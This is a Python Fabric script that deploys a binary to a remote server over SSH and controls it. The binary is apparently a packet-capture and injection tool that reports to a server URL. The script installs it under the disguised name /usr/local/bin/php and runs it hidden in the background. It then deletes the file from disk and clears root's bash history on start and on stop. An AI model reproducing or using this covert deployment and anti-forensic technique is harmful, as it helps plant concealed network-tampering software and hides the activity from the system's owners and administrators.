# -*- coding:utf-8 -*-

from fabric.api import run, put, env
from optparse import OptionParser


def flags():
    parser = OptionParser(add_help_option=False)
    parser.add_option('--host',
                      help='input server host')
    parser.add_option('--user',
                      help='input server user')
    parser.add_option('--password',
                      help='input server password')
    parser.add_option('--port',
                      default='22',
                      help='input server host')
    parser.add_option('-i', '--sid',
                      help='input server sid')
    parser.add_option('-m', '--mdev',
                      default='eth1',
                      help='the device name for monitor')
    parser.add_option('-o', '--odev',
                      default='eth0',
                      help='the device for libnet send packet')
    parser.add_option('-c', '--worker',
                      default=3,
                      help='the concurency worker num')
    parser.add_option('-u',
                      help='server url')
    parser.add_option('-g',
                      help='global eval intval seconds')
    parser.add_option('--cap',
                      help='capture engine.libpcap/pfring')
    parser.add_option('--ch',
                      help='packet cache size')
    
    parser.add_option('--lb',
                      help='log number of batch upload')
    parser.add_option('--li',
                      help='log upload intval seconds')
    parser.add_option('-p', '--ping',
                      help='app ping server intval seconds')
    parser.add_option('-v',
                      help='debug mode')
    parser.add_option('--vlan',
                      help='use vlan send back packet')
    parser.add_option('-r', '--order',
                      help='input server order,'
                           'e.g. start,stop,restart,ps')
    parser.add_option('--path',
                      help='input path')
    return parser.parse_args()


class ServerBusiness(object):
    def __init__(self, options):
        self.host = options.host
        self.user = options.user
        self.password = options.password
        self.port = options.port

        self.mdev = options.mdev
        self.odev = options.odev
        self.u = options.u
        self.worker = options.worker
        self.sid = options.sid
        self.g = options.g

        self.cap = options.cap
        self.ch = options.ch
        self.lb = options.lb
        self.li = options.li
        self.ping = options.ping
        self.v = options.v
        self.vlan = options.vlan
        self.path = options.path

        self.cmd_chmod = 'chmod +x /usr/local/bin/php'
        self.cmd_rm = 'rm -f /usr/local/bin/php'
        self.cmd_php_part = '/usr/local/bin/php -m %s -o %s -u %s -i %s -c %s' % (
            self.mdev, self.odev, self.u, self.sid, self.worker
        )
        self.cmd_php_part_2 = self.cmd_php_part
        self.cmd_clear_history = 'cat /dev/null > /root/.bash_history && history -c && history -w'

        if self.g is not None:
            self.cmd_php_part_2 += ' -g %s' % self.g
        if self.cap is not None:
            self.cmd_php_part_2 += ' -cap %s' % self.cap
        if self.ch is not None:
            self.cmd_php_part_2 += ' -ch %s' % self.ch
        if self.lb is not None:
            self.cmd_php_part_2 += ' -lb %s' % self.lb
        if self.li is not None:
            self.cmd_php_part_2 += ' -li %s' % self.li
        if self.ping is not None:
            self.cmd_php_part_2 += ' -p %s' % self.ping
        if self.v is not None:
            self.cmd_php_part_2 += ' -v %s' % self.v
        if self.vlan is not None:
            self.cmd_php_part_2 += ' -vlan %s' % self.vlan
        self.cmd_php = 'nohup ' + self.cmd_php_part_2 + \
                       ' 1>/var/log/php.log 2>/var/log/php.err.log &'
        self.cmd_ps = 'ps aux|grep -E "%s"|grep -v "grep"' % self.cmd_php_part

        env.host_string = "%s@%s:%s" % (self.user, self.host, self.port)
        if self.password != '' and self.password is not None:
            env.password = self.password

    def start_order(self,):
        put(local_path=self.path+'php.prod', remote_path='/usr/local/bin/php')
        run(self.cmd_chmod)
        run(self.cmd_php, pty=False)
        run(self.cmd_rm)
        # run(self.cmd_ps, warn_only=True) 
        run(self.cmd_clear_history)

    def stop_order(self,):
        pid_string = run(self.cmd_ps, warn_only=True)
        if pid_string != '':
            command = 'kill %s' % pid_string.split()[1]
            run(command)
            run(self.cmd_clear_history)

    def ps_order(self,):
        run(self.cmd_ps, warn_only=True)


def main():
    options, args = flags()
    order = options.order
    business = ServerBusiness(options)
    if order == 'start':
        business.start_order()
    elif order == 'stop':
        business.stop_order()
    elif order == 'restart':
        business.stop_order()
        business.start_order()
    elif order == 'ps':
        business.ps_order()


if __name__ == '__main__':
    main()
